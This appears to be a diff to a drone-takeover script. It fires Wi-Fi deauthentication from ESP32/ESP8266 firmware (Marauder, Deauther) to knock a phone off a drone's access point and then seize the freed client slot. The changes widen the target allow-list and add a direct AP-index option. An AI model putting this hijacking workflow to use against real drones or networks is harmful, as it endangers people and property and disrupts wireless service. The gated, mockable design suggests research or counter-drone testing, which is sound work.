@@ -117,11 +117,14 @@ def run(a) -> int:
     if a.deauth:
         from ml.runtime.deauth_esp32 import DeauthESP32
         target = a.drone_ssid or a.drone_prefix
-        d = DeauthESP32(authorized=[a.drone_prefix], force_mock=a.dry_run,
+        # Allow-list both the prefix and the exact SSID so a TELLO-* target isn't
+        # refused just because --drone-prefix still defaults to Pluto.
+        allow = [x for x in (a.drone_prefix, a.drone_ssid) if x]
+        d = DeauthESP32(authorized=allow, force_mock=a.dry_run,
                         firmware=a.deauth_firmware)
         log(f"ESP deauth ({d.mode}/{d.firmware}) on '{target}' "
             f"for {a.deauth_seconds:.0f}s ...")
-        log(f"  {d.run_targeted(a.drone_ssid or target, a.deauth_seconds)}")
+        log(f"  {d.run_targeted(target, a.deauth_seconds, select_index=a.deauth_index)}")
         d.close()
         # Give the phone a beat to drop and the AP to free the slot before we grab it.
         time.sleep(a.grab_delay)
@@ -189,9 +192,11 @@ def parse_args(argv=None):
     p.add_argument("--deauth", action="store_true",
                    help="fire the ESP deauth to free the single client slot first")
     p.add_argument("--deauth-firmware", choices=["marauder", "deauther"],
-                   default=os.environ.get("DEAUTH_FW", "marauder"),
-                   help="marauder (ESP32) or deauther (ESP8266). Default $DEAUTH_FW/marauder")
+                   default=os.environ.get("DEAUTH_FW", "deauther"),
+                   help="deauther (ESP8266) or marauder (ESP32). Default $DEAUTH_FW/deauther")
     p.add_argument("--deauth-seconds", type=float, default=6.0)
+    p.add_argument("--deauth-index", type=int, default=None,
+                   help="skip the ESP scan and deauth this AP index directly")
     p.add_argument("--grab-delay", type=float, default=2.0,
                    help="seconds after deauth before we seize the freed slot")
     p.add_argument("--stay", action="store_true",
